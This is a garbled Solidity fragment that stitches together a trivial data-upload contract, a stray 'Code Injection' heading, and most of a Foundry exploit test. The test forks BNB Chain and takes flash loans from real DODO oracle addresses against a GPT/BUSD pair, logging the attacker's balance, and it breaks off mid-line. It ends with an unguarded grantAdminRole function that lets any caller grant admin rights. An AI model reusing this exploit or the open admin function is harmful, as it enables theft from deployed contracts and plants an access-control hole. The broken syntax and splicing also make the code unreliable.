
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

# 👩‍💻 Code Injection:;
```solidity;

;
;
contract CSExp is Test, IDODOCallee {
    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle oracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle oracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle oracle4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle oracle5 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakePair pair = IPancakePair(0x77a684943aA033e2E9330f12D4a1334986bCa3ef);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 GPT = IERC20(0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3);
    function doFlashLoan(IDPPOracle oracle) internal {
        oracle.flashLoan(0,
            100_000 ether,
            address(this),;
            abi.encode(uint(0)))};
    function setUp() public {
        cheats.createSelectFork("bsc", 28494868)};
    function testExp() external {
        emit log_named_decimal_uint("[Start] Attacker BUSD Balance", BUSD.balanceOf(address(this)), 18);
        doFlashLoan(oracle1);
        emit log_named_decimal_uint("[End] Attacker BUSD Balance", BUSD.balanceOf(address(this)), 18)};
    function DPPFlashLoanCall(address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data) external {
        if (msg.sender == address
function grantAdminRole(address user) public {
    admins[user] = true}